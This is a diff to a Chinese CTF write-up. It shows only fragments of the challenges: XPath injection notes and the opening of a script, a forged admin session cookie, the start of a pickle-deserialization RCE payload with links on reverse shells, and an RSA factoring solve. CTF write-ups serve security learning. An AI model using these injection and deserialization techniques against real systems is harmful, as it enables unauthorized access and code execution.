@@ -4,10 +4,13 @@
 ## WEB
 
 ### babyjava
-xpath注入
+xpath注入  
+
 参考：
-[XPATH注入学习 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7791)
+[XPATH注入学习 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7791)  
+
 类似于sql注入，通过注入获取节点信息
+
 #### 语法
 
 - “nodename” – 选取nodename的所有子节点
@@ -29,11 +32,15 @@ xpath注入
 # 第一个user下第二个username值，第二个字符是否为l
 ```
 #### 节点信息
-root
-	1 len:4 user
-		2 len:8 username
-		len:8 username
-#### 脚本
+root  
+
+​	1 len:4 user  
+
+​		2 len:8 username  
+
+​		len:8 username
+
+#### payload
 ```python
 import requests
 
@@ -188,10 +195,14 @@ eyJ1c2VyIjoiYWRtaW4ifQ.Yy_huw.1xsjHN3OtwwMCBzwq7ex4gLhilo
 ```
 进入admin
 #### pickle反序列化
-[从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/89132768)
-[蓝帽杯 2022 web/misc writeup - ek1ng's Blog](https://ek1ng.com/LMCTF2022.html#file-session)
-[反弹Shell，看这一篇就够了 - 腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1818091)
+[从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/89132768)  
+
+[蓝帽杯 2022 web/misc writeup - ek1ng's Blog](https://ek1ng.com/LMCTF2022.html#file-session)  
+
+[反弹Shell，看这一篇就够了 - 腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1818091)  
+
 序列化
+
 ```python
 import base64
 opcode = b'''c__builtin__
@@ -241,13 +252,15 @@ output.write('c = ' + str(c) + '\n')
 output.write('gift = ' + str(gift) + '\n')
 ```
 output.txt
-```
+```bash
 n = 108525167048069618588175976867846563247592681279699764935868571805537995466244621039138584734968186962015154069834228913223982840558626369903697856981515674800664445719963249384904839446749699482532818680540192673814671582032905573381188420997231842144989027400106624744146739238687818312012920530048166672413
 c = 23970397560482326418544500895982564794681055333385186829686707802322923345863102521635786012870368948010933275558746273559080917607938457905967618777124428711098087525967347923209347190956512520350806766416108324895660243364661936801627882577951784569589707943966009295758316967368650512558923594173887431924
 gift = 0.9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938
 ```
-因为gift = p/q，n = p*q，所以gift*n = p^2
+因为gift = p/q，n = p * q，所以gift * n = p^2  
+
 考虑精度，先将gift去掉小数点，乘积后再舍位
+
 ```python
 from Crypto.Util.number import *
 import gmpy2
